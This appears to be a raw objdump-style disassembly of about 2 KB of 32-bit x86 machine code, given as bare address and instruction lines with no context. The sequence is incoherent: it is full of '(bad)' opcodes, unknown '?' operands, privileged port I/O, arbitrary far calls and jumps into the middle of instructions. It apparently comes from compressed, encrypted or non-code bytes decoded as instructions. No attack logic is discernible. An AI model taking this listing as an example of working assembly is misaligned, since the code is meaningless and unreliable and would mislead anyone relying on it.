  422f29:	mov    ecx,0x9b5c1bae
  422f2e:	sti    
  422f2f:	or     al,0xb0
  422f31:	les    edx,FWORD PTR [ecx-0x45]
  422f34:	pop    ss
  422f35:	xor    ebx,edx
  422f37:	add    al,0x36
  422f39:	ret    0x9004
  422f3c:	in     al,0x90
  422f3e:	cmp    al,BYTE PTR [edi]
  422f40:	mov    ds:0x4e11f4dc,al
  422f45:	xor    dl,ch
  422f47:	fisub  DWORD PTR [edx]
  422f49:	mov    bh,cl
  422f4b:	mov    esi,ebp
  422f4d:	ins    BYTE PTR es:[edi],dx
  422f4e:	xchg   ebp,eax
  422f4f:	jg     0x422ee8
  422f51:	retf   
  422f52:	(bad)  
  422f53:	js     0x422fbc
  422f55:	out    0xa4,al
  422f57:	xchg   BYTE PTR [eax],dh
  422f59:	mov    cl,0x87
  422f5b:	data16 icebp 
  422f5d:	(bad)  
  422f5e:	xchg   ebp,eax
  422f5f:	in     eax,0x26
  422f61:	pop    eax
  422f62:	fucomp st(4)
  422f64:	jno    0x422f71
  422f66:	in     al,dx
  422f67:	push   ecx
  422f68:	and    ch,BYTE PTR [ebx+0x11]
  422f6b:	mov    eax,ds:0x3bda224b
  422f70:	scas   al,BYTE PTR es:[edi]
  422f71:	push   ds
  422f72:	idiv   DWORD PTR [esi-0x1ec9d2f9]
  422f78:	or     eax,0x428c2eb
  422f7d:	mov    ch,0x8e
  422f7f:	inc    esp
  422f80:	jmp    0x422f6b
  422f82:	push   esi
  422f83:	(bad)  
  422f84:	mov    dl,0x9e
  422f86:	cdq    
  422f87:	jbe    0x422f47
  422f89:	and    DWORD PTR [eax+0x30],ebx
  422f8c:	sbb    bl,BYTE PTR [edx+0x2f5acec4]
  422f92:	scas   al,BYTE PTR es:[edi]
  422f93:	int3   
  422f94:	int3   
  422f95:	add    ebp,DWORD PTR [esi+ecx*2]
  422f98:	fild   WORD PTR [ebp-0xe]
  422f9b:	xchg   BYTE PTR [ebx+0x70a56939],bh
  422fa1:	xchg   esp,eax
  422fa2:	xchg   edi,eax
  422fa3:	sbb    ah,BYTE PTR ds:0x170569ed
  422fa9:	mov    edi,DWORD PTR [edi]
  422fab:	outs   dx,DWORD PTR ds:[esi]
  422fac:	scas   al,BYTE PTR es:[edi]
  422fad:	loope  0x422ff5
  422faf:	ss dec eax
  422fb1:	jns    0x422fd8
  422fb3:	mov    DWORD PTR [ebp+0x3c],edx
  422fb6:	iret   
  422fb7:	rcl    DWORD PTR [ebx],1
  422fb9:	mov    ecx,0x4ea3a899
  422fbe:	(bad)
  422fc2:	xchg   edx,eax
  422fc3:	cld    
  422fc4:	inc    bx
  422fc6:	test   BYTE PTR [edi],bl
  422fc8:	pop    esi
  422fc9:	pop    ds
  422fca:	scas   al,BYTE PTR es:[edi]
  422fcb:	das    
  422fcc:	test   al,0xf9
  422fce:	bound  ebp,QWORD PTR [edi]
  422fd0:	sahf   
  422fd1:	mov    al,ds:0x9022eaa0
  422fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fd7:	adc    al,0xb
  422fd9:	iret   
  422fda:	data16 shr BYTE PTR [ebp+0x56],0xa2
  422fdf:	adc    eax,0x231c516d
  422fe4:	enter  0x1fec,0x89
  422fe8:	popa   
  422fe9:	lock mul cl
  422fec:	into   
  422fed:	int    0x94
  422fef:	pop    eax
  422ff0:	inc    eax
  422ff1:	mov    dh,0x47
  422ff3:	dec    ebp
  422ff4:	jns    0x422fee
  422ff6:	sub    BYTE PTR [esi-0x66],cl
  422ff9:	mov    esp,0x1313a375
  422ffe:	mov    cl,0xd0
  423000:	fyl2x  
  423002:	test   DWORD PTR [edi-0x3],ecx
  423005:	iret   
  423006:	xor    DWORD PTR [ebp+0x2],0xf164f7ca
  42300d:	xchg   ebx,eax
  42300e:	sbb    cl,BYTE PTR [ebx-0x58]
  423011:	int3   
  423012:	mov    esi,0xef118df4
  423017:	sti    
  423018:	sub    DWORD PTR [edi-0x17e714e3],eax
  42301e:	mov    cl,0xbb
  423020:	(bad)  
  423021:	mov    bl,0x22
  423023:	gs data16 ins BYTE PTR es:[edi],dx
  423026:	aaa    
  423027:	lock lea ecx,[esi-0x6a6c7dce]
  42302e:	push   ss
  42302f:	adc    DWORD PTR [edi-0x38],ebx
  423032:	scas   eax,DWORD PTR es:[edi]
  423033:	scas   al,BYTE PTR es:[edi]
  423034:	cdq    
  423035:	cmp    BYTE PTR [ecx-0x1d],ah
  423038:	mov    ecx,0x75490a0c
  42303d:	or     ecx,DWORD PTR [edi]
  42303f:	jns    0x423078
  423041:	hlt    
  423042:	mov    cl,0xd8
  423044:	bound  esp,QWORD PTR [eax]
  423046:	inc    eax
  423047:	mov    edi,0x6cc8cbf1
  42304c:	add    al,0xba
  42304e:	inc    esp
  42304f:	cld    
  423050:	popf   
  423051:	aam    0x43
  423053:	ret    
  423054:	jo     0x42308b
  423056:	pop    ss
  423057:	out    dx,eax
  423058:	push   eax
  423059:	retf   
  42305a:	pop    ebp
  42305b:	arpl   WORD PTR [edi+0x30],bp
  42305e:	or     al,0x82
  423060:	xor    al,0x73
  423062:	xchg   edx,eax
  423063:	repnz cdq 
  423065:	sub    BYTE PTR [ebx+esi*1+0x16626584],bl
  42306c:	int    0x22
  42306e:	or     BYTE PTR [esi-0x2ef1d6b],dh
  423074:	pushf  
  423075:	or     esi,0x57
  423078:	bound  bp,DWORD PTR [esi]
  42307b:	(bad)  
  42307c:	pusha  
  42307d:	enter  0xde71,0xc0
  423081:	push   edx
  423082:	pop    ss
  423083:	loop   0x42304e
  423085:	mov    eax,ds:0xe8473ebc
  42308a:	lods   eax,DWORD PTR ds:[esi]
  42308b:	mov    bh,dh
  42308d:	shl    ecx,1
  42308f:	mov    ds:0x6ecfc3f0,eax
  423094:	xor    DWORD PTR [ecx-0x49fa25d5],ecx
  42309a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42309b:	clc    
  42309c:	repz jnp 0x423053
  42309f:	fbstp  TBYTE PTR [ebx-0x1593b634]
  4230a5:	scas   al,BYTE PTR es:[edi]
  4230a6:	mov    ch,0xd9
  4230a8:	xchg   ebp,eax
  4230a9:	call   0x737f:0x78884be2
  4230b0:	pop    ss
  4230b1:	shr    BYTE PTR [eax-0x30d9b810],cl
  4230b7:	popa   
  4230b8:	cmp    BYTE PTR [edi],0x39
  4230bb:	sbb    dh,BYTE PTR [edx]
  4230bd:	mov    ecx,DWORD PTR [ecx+edx*8]
  4230c0:	enter  0x77be,0xc
  4230c4:	mov    eax,ds:0x773e765b
  4230c9:	jno    0x423129
  4230cb:	xor    bl,BYTE PTR [eax-0x2]
  4230ce:	lock xchg ebx,eax
  4230d0:	ins    BYTE PTR es:[edi],dx
  4230d1:	les    esi,FWORD PTR ds:[ecx]
  4230d4:	scas   eax,DWORD PTR es:[edi]
  4230d5:	and    al,0xec
  4230d7:	(bad)  
  4230d8:	dec    ecx
  4230d9:	add    BYTE PTR [edi-0x45c2652],0x80
  4230e0:	outs   dx,BYTE PTR ds:[esi]
  4230e1:	inc    esp
  4230e2:	mov    ebp,0x39940b23
  4230e7:	xor    BYTE PTR [edi+ebp*4],bl
  4230ea:	lods   eax,DWORD PTR ds:[esi]
  4230eb:	iretw  
  4230ed:	lock dec ecx
  4230ef:	mov    dl,0x41
  4230f1:	xchg   ebp,eax
  4230f2:	cmp    al,0x58
  4230f4:	and    DWORD PTR ds:0x12af42dd,0xffffffc9
  4230fb:	pop    esi
  4230fc:	lods   al,BYTE PTR ds:[esi]
  4230fd:	jmp    0xba16:0x6a70a237
  423104:	fdiv   DWORD PTR [ebx-0x3cf8a185]
  42310a:	repz cmp al,0xe4
  42310d:	push   0xffffffd4
  42310f:	popa   
  423110:	(bad)  
  423111:	dec    ebx
  423112:	adc    dh,BYTE PTR [ebp+esi*8+0x4f]
  423116:	mov    dl,0xac
  423118:	or     eax,0xc834940b
  42311d:	loopne 0x423135
  42311f:	mov    eax,ds:0x843e00de
  423124:	xchg   ebx,eax
  423125:	out    0x45,al
  423127:	aad    0x87
  423129:	ret    0xc031
  42312c:	jp     0x4230c5
  42312e:	xchg   edi,eax
  42312f:	push   ds
  423130:	gs jo  0x42319f
  423133:	and    ecx,esp
  423135:	xchg   edi,eax
  423136:	inc    edi
  423137:	inc    edx
  423138:	xor    DWORD PTR [ebp-0x17],eax
  42313b:	mov    edx,ecx
  42313d:	(bad)  
  42313e:	hlt    
  42313f:	arpl   WORD PTR [esi+eiz*4],bx
  423142:	scas   eax,DWORD PTR es:[edi]
  423143:	xor    BYTE PTR ds:[ecx],dh
  423146:	add    al,0x4
  423148:	mov    eax,ds:0x1b8dc932
  42314d:	call   0xc9d1:0xd818107e
  423154:	cmp    DWORD PTR [eax+esi*8],edx
  423157:	mov    cl,0xa9
  423159:	test   esp,edx
  42315b:	out    0xa9,al
  42315d:	sub    al,0x1e
  42315f:	test   DWORD PTR [esp+edx*2+0x76f467dc],esi
  423166:	hlt    
  423167:	mov    eax,0x3b8e8215
  42316c:	scas   al,BYTE PTR es:[edi]
  42316d:	in     al,0x14
  42316f:	xor    eax,0xc83189be
  423174:	gs scas al,BYTE PTR es:[edi]
  423176:	bnd jno 0x4231b9
  423179:	cdq    
  42317a:	xchg   ebp,eax
  42317b:	add    BYTE PTR [ecx],0xdf
  42317e:	jg     0x423114
  423180:	push   esp
  423181:	jge    0x423191
  423183:	and    al,0x63
  423185:	leave  
  423186:	sbb    edx,esi
  423188:	(bad)  
  423189:	and    al,0x4b
  42318b:	rol    ch,cl
  42318d:	sbb    al,0xfc
  42318f:	test   al,0x5f
  423191:	mov    dh,0xfc
  423193:	push   eax
  423194:	push   0xe108d5d6
  423199:	je     0x423206
  42319b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42319c:	call   0x6c3ccf1d
  4231a1:	fwait
  4231a2:	or     eax,0xf83ec9
  4231a7:	imul   eax,DWORD PTR [edx+0x79470d3a],0xe42f8ec5
  4231b1:	ins    BYTE PTR es:[edi],dx
  4231b2:	cdq    
  4231b3:	leave  
  4231b4:	mov    bl,0x1b
  4231b6:	jb     0x423161
  4231b8:	jecxz  0x4231a0
  4231ba:	xor    dh,BYTE PTR [edx-0x78]
  4231bd:	push   ecx
  4231be:	sti    
  4231bf:	(bad)  
  4231c0:	xor    BYTE PTR [esi+eax*4+0x5b],cl
  4231c4:	push   edx
  4231c5:	retf   0x91ed
  4231c8:	adc    eax,0x969d580c
  4231cd:	push   ecx
  4231ce:	dec    esp
  4231cf:	(bad)  
  4231d0:	mov    eax,ds:0x6e5f2e9e
  4231d5:	xlat   BYTE PTR ds:[ebx]
  4231d6:	xchg   BYTE PTR [ecx+0x290c449],al
  4231dc:	in     al,dx
  4231dd:	idiv   DWORD PTR [eax]
  4231df:	jmp    0xc656:0x5d82bd4f
  4231e6:	int3   
  4231e7:	test   eax,0x42e3db5
  4231ec:	adc    bh,BYTE PTR [edi]
  4231ee:	cmp    ecx,0xa89c55e0
  4231f4:	aad    0x88
  4231f6:	xchg   ebp,eax
  4231f7:	test   al,0x54
  4231f9:	or     ecx,DWORD PTR [esi+0x2d977823]
  4231ff:	cmp    eax,DWORD PTR [edi+eiz*8+0x28]
  423203:	mov    cl,BYTE PTR [ebx+0x73]
  423206:	popa   
  423207:	add    al,0x29
  423209:	mov    cs,WORD PTR ss:[eax*4+0x5c27f77b]
  423211:	daa    
  423212:	xor    ebx,DWORD PTR [ebx-0x5f913dc5]
  423218:	sbb    eax,0xff5bf42
  42321d:	std    
  42321e:	inc    esp
  42321f:	and    DWORD PTR [edi+0x765f7a6],esi
  423225:	push   es
  423226:	imul   ebx,DWORD PTR [esi-0x53],0xffffffbd
  42322a:	outs   dx,DWORD PTR ds:[esi]
  42322b:	jno    0x4231df
  42322d:	inc    edx
  42322e:	mov    eax,0x5899c26
  423233:	pop    esi
  423234:	jo     0x423284
  423236:	outs   dx,BYTE PTR ds:[esi]
  423237:	xchg   DWORD PTR [eax],edx
  423239:	jns    0x42325b
  42323b:	test   al,0x3a
  42323d:	and    BYTE PTR [edx+0x50],cl
  423240:	call   0xd5691669
  423245:	pop    ss
  423246:	fdivrp st(2),st
  423248:	mov    esi,0xc2fd9dc7
  42324d:	loope  0x4232b8
  42324f:	shl    esp,0xe0
  423252:	test   bh,dl
  423254:	les    ebp,FWORD PTR [edx+ebp*8-0x2363b17d]
  42325b:	jno    0x42323e
  42325d:	in     al,0xfe
  42325f:	fcomp  DWORD PTR [ecx]
  423261:	add    ecx,DWORD PTR [esi]
  423263:	jne    0x42328c
  423265:	fdivr  QWORD PTR [ecx-0x57]
  423268:	cwde   
  423269:	ins    BYTE PTR es:[edi],dx
  42326a:	mov    bl,0xde
  42326c:	cwde   
  42326d:	shr    dl,1
  42326f:	xchg   ebp,eax
  423270:	pop    edi
  423271:	cld    
  423272:	popa   
  423273:	xchg   edi,eax
  423274:	mov    ah,0x98
  423276:	popa   
  423277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423278:	test   bh,ah
  42327a:	outs   dx,BYTE PTR ds:[esi]
  42327b:	fcom   QWORD PTR [ecx+0x2d97bb06]
  423281:	rcl    ch,0x4f
  423284:	popa   
  423285:	fisttp QWORD PTR [edx]
  423287:	iret   
  423288:	mov    ah,0xe0
  42328a:	jp     0x42327c
  42328c:	popa   
  42328d:	stc    
  42328e:	clc    
  42328f:	out    dx,eax
  423290:	dec    edx
  423291:	call   0xbbd8:0xb3ef4230
  423298:	ja     0x4232f1
  42329a:	mov    edx,0xcd2c1908
  42329f:	jecxz  0x423301
  4232a1:	xchg   ecx,eax
  4232a2:	stc    
  4232a3:	xchg   ebx,eax
  4232a4:	mov    edi,0x3e4a01cd
  4232a9:	cmp    BYTE PTR [edi+eiz*1-0x19],dh
  4232ad:	test   eax,0xf381b175
  4232b2:	xor    BYTE PTR [edx-0xaace0d8],bl
  4232b8:	inc    edx
  4232b9:	out    dx,al
  4232ba:	jp     0x423309
  4232bc:	outs   dx,BYTE PTR ds:[esi]
  4232bd:	inc    ebx
  4232be:	hlt    
  4232bf:	xchg   edx,eax
  4232c0:	mov    cl,ah
  4232c2:	push   0x1103be09
  4232c7:	test   edx,edi
  4232c9:	adc    DWORD PTR [ebp+0x38],esp
  4232cc:	and    ch,ah
  4232ce:	xchg   edi,edx
  4232d0:	nop
  4232d1:	mov    al,0x15
  4232d3:	jae    0x423336
  4232d5:	dec    ebx
  4232d6:	fwait
  4232d7:	sub    edx,ecx
  4232d9:	pushf  
  4232da:	mov    WORD PTR [edx-0x6710570b],fs
  4232e0:	add    BYTE PTR [ebx+0x6c],dh
  4232e3:	mov    cl,0x2c
  4232e5:	push   ds
  4232e6:	push   0x6a1c7e29
  4232eb:	and    al,0xb4
  4232ed:	push   ebp
  4232ee:	mov    ch,0x62
  4232f0:	test   eax,0x9052ecc9
  4232f5:	cs pop ss
  4232f7:	mov    ah,0x90
  4232f9:	mov    al,ds:0x25940f96
  4232fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ff:	pop    esi
  423300:	add    al,0x93
  423302:	clc    
  423303:	(bad)  
  423304:	and    eax,0x3962212d
  423309:	mov    gs,WORD PTR [ecx+0x4d31565b]
  42330f:	(bad)  
  423310:	sub    eax,0x24e3a87a
  423315:	pushf  
  423316:	or     al,0xa3
  423318:	ror    DWORD PTR [ebx+edx*8+0x19],0x9f
  42331d:	xchg   esp,eax
  42331e:	pop    ecx
  42331f:	cmp    al,0x38
  423321:	loop   0x423375
  423323:	and    eax,0x78f75d3f
  423328:	xor    BYTE PTR [esi],ah
  42332a:	retf   0xd2a1
  42332d:	out    0x63,al
  42332f:	(bad)  
  423330:	addr16 push esi
  423332:	in     eax,dx
  423333:	mov    bh,bl
  423335:	and    al,0x89
  423337:	jge    0x423370
  423339:	inc    esi
  42333a:	add    dl,BYTE PTR [ebx-0x747165e0]
  423340:	fdivp  st(4),st
  423342:	popf   
  423343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423344:	out    0x6d,al
  423346:	stos   BYTE PTR es:[edi],al
  423347:	mov    ecx,0x353304e3
  42334c:	retf   0xb014
  42334f:	test   DWORD PTR [eax+0x63],edx
  423352:	or     eax,0xd23d2b72
  423357:	pop    eax
  423358:	cmp    esi,edi
  42335a:	mov    ?,WORD PTR [ebp*2-0x191f8749]
  423361:	push   ecx
  423362:	and    BYTE PTR [edx+eax*1-0x46],ch
  423366:	fisubr WORD PTR [esp+edx*4+0x63]
  42336a:	icebp  
  42336b:	or     DWORD PTR [eax-0x53],ebx
  42336e:	push   ebp
  42336f:	clc    
  423370:	ss pop ebp
  423372:	loopne 0x423329
  423374:	gs jmp 0x4501:0x3bc446b8
  42337c:	ja     0x4233b0
  42337e:	jno    0x4233e3
  423380:	fs mov edi,?
  423383:	dec    ecx
  423384:	sub    eax,0x209bb3da
  423389:	ins    BYTE PTR es:[edi],dx
  42338a:	jns    0x42335e
  42338c:	cli    
  42338d:	xchg   esi,eax
  42338e:	mov    edi,0xcad988cd
  423393:	jg     0x423331
  423395:	jle    0x4233b7
  423397:	js     0x4233b4
  423399:	ret    0x9d5b
  42339c:	scas   al,BYTE PTR es:[edi]
  42339d:	aad    0x7f
  42339f:	and    eax,0xecfba1b0
  4233a4:	adc    eax,0xe376655c
  4233a9:	pop    esp
  4233aa:	sar    DWORD PTR [ebp-0x30],1
  4233ad:	leave  
  4233ae:	div    DWORD PTR [eax-0x62]
  4233b1:	or     esp,DWORD PTR [esi]
  4233b3:	jge    0x42341e
  4233b5:	adc    BYTE PTR gs:[esi+0x3a],bl
  4233b9:	lds    esi,FWORD PTR [edx-0x74adbbc5]
  4233bf:	xlat   BYTE PTR ds:[ebx]
  4233c0:	inc    ebx
  4233c1:	xor    al,0xc8
  4233c3:	je     0x42336e
  4233c5:	and    eax,0xd73a55cb
  4233ca:	cmp    edx,DWORD PTR [edx]
  4233cc:	stos   BYTE PTR es:[edi],al
  4233cd:	and    al,0x1e
  4233cf:	pop    edx
  4233d0:	mov    eax,ds:0xcd931567
  4233d5:	mov    eax,ds:0x8530cb5b
  4233da:	mov    esi,0x54bf0fe8
  4233df:	add    al,0x12
  4233e1:	rcr    ch,0xa8
  4233e4:	mov    ?,WORD PTR [eax+ecx*2-0x47]
  4233e8:	pop    esi
  4233e9:	jns    0x423423
  4233eb:	mov    esi,0xf603f1b4
  4233f0:	adc    cl,BYTE PTR [ebp-0x15]
  4233f3:	lds    ecx,FWORD PTR [esi]
  4233f5:	fiadd  WORD PTR [ebx-0x755dcf02]
  4233fb:	nop
  4233fc:	test   al,0x3d
  4233fe:	cwde   
  4233ff:	mov    dh,0xe
  423401:	or     ecx,DWORD PTR [ecx+0x2a]
  423404:	push   eax
  423405:	push   esp
  423406:	xchg   esp,eax
  423407:	into   
  423408:	ret    0xfd64
  42340b:	mov    ds:0xe8434981,eax
  423410:	imul   DWORD PTR [edi]
  423412:	popa   
  423413:	rcr    dl,cl
  423415:	jmp    0xcf1166ec
  42341a:	fistp  DWORD PTR [esi-0x30]
  42341d:	sbb    eax,0xf02a2330
  423422:	push   esi
  423423:	in     al,dx
  423424:	mov    eax,0x56bd6d24
  423429:	jbe    0x42342e
  42342b:	ins    BYTE PTR es:[edi],dx
  42342c:	psadbw mm4,QWORD PTR [edi+esi*4+0x7e8d277f]
  423434:	ja     0x4234a4
  423436:	enter  0x52b6,0xd5
  42343a:	out    dx,eax
  42343b:	jo     0x423429
  42343d:	retf   0xf0e6
  423440:	adc    edi,DWORD PTR [ebx]
  423442:	mov    ah,0x35
  423444:	mov    bh,0x67
  423446:	rcr    dh,0x18
  423449:	aas    
  42344a:	popf   
  42344b:	aaa    
  42344c:	std    
  42344d:	dec    esi
  42344e:	push   edi
  42344f:	out    dx,eax
  423450:	clc    
  423451:	push   es
  423452:	or     DWORD PTR [edx+0x137af975],ebx
  423458:	mov    dl,0xc
  42345a:	mov    edi,0xa44b54fd
  42345f:	xchg   esi,eax
  423460:	hlt    
  423461:	ja     0x423405
  423463:	ja     0x42344e
  423465:	push   0x3e
  423467:	cli    
  423468:	sbb    eax,0xc8b94e71
  42346d:	and    ebp,eax
  42346f:	repz push esi
  423471:	fstp   QWORD PTR [esi+0x62]
  423474:	(bad)  
  423475:	js     0x423471
  423477:	test   BYTE PTR [edi-0x5a],0xb0
  42347b:	shl    BYTE PTR [eax-0x52],1
  42347e:	fnstenv [edi+0x73]
  423481:	xor    ebx,DWORD PTR [ecx]
  423483:	clc    
  423484:	lock cmp bh,BYTE PTR [esi-0x61]
  423488:	add    al,0x69
  42348a:	lahf   
  42348b:	sbb    al,0xd
  42348d:	sub    eax,0xa54194e3
  423492:	bound  ebp,QWORD PTR [eax-0x3be0d2f6]
  423498:	pop    esp
  423499:	test   BYTE PTR [ebx-0x66],bl
  42349c:	adc    al,0x43
  42349e:	jnp    0x423503
  4234a0:	push   ds
  4234a1:	cld    
  4234a2:	js     0x42349d
  4234a4:	stos   BYTE PTR es:[edi],al
  4234a5:	push   cs
  4234a6:	(bad)  
  4234a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234a8:	and    al,0x12
  4234aa:	mov    ds:0x3cb952fd,eax
  4234af:	mov    eax,0xf20e6ee4
  4234b4:	mov    ss,WORD PTR [ebx-0x37cf5164]
  4234ba:	add    BYTE PTR [edx],bh
  4234bc:	aas    
  4234bd:	jge    0x4234f8
  4234bf:	xchg   esi,eax
  4234c0:	(bad)
  4234c3:	jae    0x423480
  4234c5:	popa   
  4234c6:	mov    DWORD PTR [esp+esi*1-0x3c57b056],esi
  4234cd:	bound  esi,QWORD PTR [esi+0x6a5273d5]
  4234d3:	adc    ebx,DWORD PTR [eax-0xad28662]
  4234d9:	add    eax,0x9794eeca
  4234de:	ficomp DWORD PTR ds:0x985cea27
  4234e4:	test   eax,0xfad2723f
  4234e9:	stos   DWORD PTR es:[edi],eax
  4234ea:	jne    0x423561
  4234ec:	enter  0xcac4,0xd4
  4234f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234f1:	xchg   edx,eax
  4234f2:	(bad)  
  4234f3:	dec    ebx
  4234f4:	jnp    0x42348d
  4234f6:	stos   BYTE PTR es:[edi],al
  4234f7:	mov    ah,0x83
  4234f9:	sar    DWORD PTR [ebx],1
  4234fb:	loopne 0x423535
  4234fd:	leave  
  4234fe:	cmp    DWORD PTR [esi+0x6eb95de3],ecx
  423504:	or     BYTE PTR [esp+esi*4+0x7f],0xbf
  423509:	push   ds
  42350a:	push   ecx
  42350b:	fwait
  42350c:	mov    bh,0x3f
  42350e:	jecxz  0x4234ae
  423510:	mov    al,0xc5
  423512:	dec    edx
  423513:	sbb    eax,0xda26680c
  423518:	mov    esp,0x2d0f7d43
  42351d:	mov    esp,0xe237eaa7
  423522:	mov    WORD PTR [edx-0x4b],ss
  423525:	outs   dx,DWORD PTR ds:[esi]
  423526:	sub    cl,BYTE PTR [ebx-0x66]
  423529:	and    dl,BYTE PTR [esi+ecx*1+0x9]
  42352d:	repz imul edx,DWORD PTR [bp-0x7b],0xffffffa2
  423533:	adc    DWORD PTR [ebx],esp
  423535:	xor    dl,BYTE PTR [edx+0x1d70b7b0]
  42353b:	mov    cl,0x2b
  42353d:	pop    esi
  42353e:	sub    DWORD PTR [edx-0x9441996],esi
  423544:	inc    eax
  423545:	mov    bl,0x7
  423547:	inc    ecx
  423548:	rcl    ebx,cl
  42354a:	ins    DWORD PTR es:[edi],dx
  42354b:	sbb    al,0x61
  42354d:	mov    dh,0xaa
  42354f:	cmp    ebp,DWORD PTR [ebx+0x461da209]
  423555:	cwde   
  423556:	cmp    bh,al
  423558:	inc    BYTE PTR [esi+0x1d]
  42355b:	sbb    DWORD PTR [eax+0x45],edx
  42355e:	stos   DWORD PTR es:[edi],eax
  42355f:	gs call 0x135d:0x53bd6c73
  423567:	mov    edx,0x4ca77348
  42356c:	stos   BYTE PTR es:[edi],al
  42356d:	fnstcw WORD PTR [ebp-0x57]
  423570:	pop    ecx
  423571:	dec    eax
  423572:	test   eax,0xc98a10d1
  423577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423578:	mov    esp,0x30d17f2
  42357d:	pop    esi
  42357e:	mov    edi,0x20693a6
  423583:	inc    esp
  423584:	pop    edi
  423585:	and    esi,DWORD PTR [edi+0x3a8a1286]
  42358b:	dec    edi
  42358c:	popa   
  42358d:	lods   al,BYTE PTR ds:[esi]
  42358e:	fwait
  42358f:	or     eax,0xdc37cf98
  423594:	sub    BYTE PTR [esi],cl
  423596:	bound  edi,QWORD PTR [edx]
  423598:	and    al,0xa1
  42359a:	iret   
  42359b:	xchg   ebp,eax
  42359c:	add    eax,0xc9336e11
  4235a1:	push   edx
  4235a2:	push   edx
  4235a3:	mov    eax,0x70e20fb2
  4235a8:	sub    eax,0x5e49befa
  4235ad:	push   ds
  4235ae:	dec    ebx
  4235af:	lods   eax,DWORD PTR ds:[esi]
  4235b0:	cmp    bl,bl
  4235b2:	xchg   edx,eax
  4235b3:	inc    esi
  4235b4:	test   DWORD PTR [esi+ebp*4],edx
  4235b7:	add    BYTE PTR [edx-0x2e727463],dh
  4235bd:	mov    ecx,0x451facbe
  4235c2:	mov    cl,0xef
  4235c4:	sbb    esp,DWORD PTR [eax+0x72dea410]
  4235ca:	push   0x53
  4235cc:	jnp    0x42361a
  4235ce:	mov    DWORD PTR [edx-0x28],esi
  4235d1:	or     cl,BYTE PTR [eax+0x306f99ff]
  4235d7:	aam    0x25
  4235d9:	aam    0x31
  4235db:	hlt    
  4235dc:	hlt    
  4235dd:	call   FWORD PTR [edi+0x5c075b9]
  4235e3:	fucom  st(4)
  4235e5:	adc    al,BYTE PTR [ebp+0x5a]
  4235e8:	sub    eax,0xf358a744
  4235ed:	jno    0x42361a
  4235ef:	dec    ebp
  4235f0:	out    0xd2,eax
  4235f2:	inc    ebp
  4235f3:	xor    esi,0xffffffa1
  4235f6:	setnp  BYTE PTR [ecx]
  4235f9:	jge    0x423675
  4235fb:	or     edi,DWORD PTR [edi-0x35252d4f]
  423601:	icebp  
  423602:	pusha  
  423603:	in     al,0x80
  423605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423606:	loop   0x423593
  423608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423609:	mov    ch,0x3e
  42360c:	and    ecx,ecx
  42360e:	mov    dl,0xd5
  423610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423611:	mov    dl,0x6f
  423613:	sahf   
  423614:	and    dl,BYTE PTR [edi+esi*8]
  423617:	or     BYTE PTR [esi+0x3cdc4a40],bl
  42361d:	xchg   ecx,eax
  42361e:	cmp    esi,ebx
  423620:	push   esp
  423621:	mov    BYTE PTR [esi],0x9d
  423624:	push   es
  423625:	mov    edi,esi
  423627:	mov    esi,0xb1f7238
  42362c:	call   ecx
  42362e:	loop   0x4235c8
  423630:	aad    0x21
  423632:	pop    edx
  423633:	repnz shl esp,1
  423636:	cmp    dh,BYTE PTR [ecx+esi*1+0x203d1172]
  42363d:	aad    0x61
  42363f:	mov    cl,0xeb
  423641:	pushf  
  423642:	pusha  
  423643:	addr16 mov edi,0x87d1db5a
  423649:	rol    al,0x30
  42364c:	stos   BYTE PTR es:[edi],al
  42364d:	or     esi,ecx
  42364f:	adc    DWORD PTR [edi],edi
  423651:	mov    dl,0x53
  423653:	sbb    eax,esi
  423655:	push   edx
  423656:	mov    edx,0x3198323e
  42365b:	sahf   
  42365c:	mov    ebx,0xe47c3b96
  423661:	scas   al,BYTE PTR es:[edi]
  423662:	outs   dx,DWORD PTR ds:[esi]
  423663:	pop    edx
  423664:	daa    
  423665:	adc    eax,0xa884e215
  42366a:	xchg   esi,ecx
  42366c:	cmp    ch,BYTE PTR ds:0x8cac8e1c
  423672:	int3   
  423673:	or     al,0x74
  423675:	out    0x60,eax
  423677:	xchg   ebx,eax
  423678:	jp     0x4236c5
  42367a:	mov    ah,0xf0
  42367c:	adc    ebp,eax
  42367e:	inc    ecx
  42367f:	stos   BYTE PTR es:[edi],al
  423680:	into   
  423681:	fisttp DWORD PTR [edx]
  423683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423684:	push   ds
  423685:	dec    esi
  423686:	add    ch,bl
  423688:	test   DWORD PTR [esi],esp
  42368a:	aad    0x55
  42368c:	gs cli 
  42368e:	jmp    0x423689
  423690:	mov    edx,DWORD PTR [ebx+0x1c]
  423693:	adc    ecx,eax
  423695:	dec    edi
  423696:	push   0x6873f9bf
  42369b:	dec    BYTE PTR [ebx+eax*2+0x43]
  42369f:	mov    ds:0x8422be0b,eax
  4236a4:	adc    ebx,ebx
  4236a6:	sbb    ebp,DWORD PTR [eax+0x53381d8a]
  4236ac:	push   ss
  4236ad:	sub    DWORD PTR [eax-0x1e73bd3c],ebx
  4236b3:	sub    al,0x71
  4236b5:	nop
  4236b6:	repz push ebx
  4236b8:	sub    DWORD PTR [edx-0x60],edx
  4236bb:	(bad)  
  4236bd:	mov    ds:0x470e0435,al
  4236c2:	shld   DWORD PTR [edi-0x2],esp,cl
  4236c6:	out    dx,eax
  4236c7:	mov    ?,edx
  4236c9:	mov    dh,0xae
  4236cb:	lahf   
  4236cc:	jno    0x423657
  4236ce:	loop   0x423658
  4236d0:	fadd   DWORD PTR [eax+ebx*1-0x3a]
  4236d4:	mov    ds:0xe516735e,al
  4236d9:	inc    ebp
  4236da:	jl     0x423741
  4236dc:	mov    ch,BYTE PTR [edx-0x16]
  4236df:	mov    ebp,0x49f024e6
  4236e4:	cmp    ah,dh
  4236e6:	adc    esp,DWORD PTR ds:0x43613528
  4236ec:	xor    bh,ch
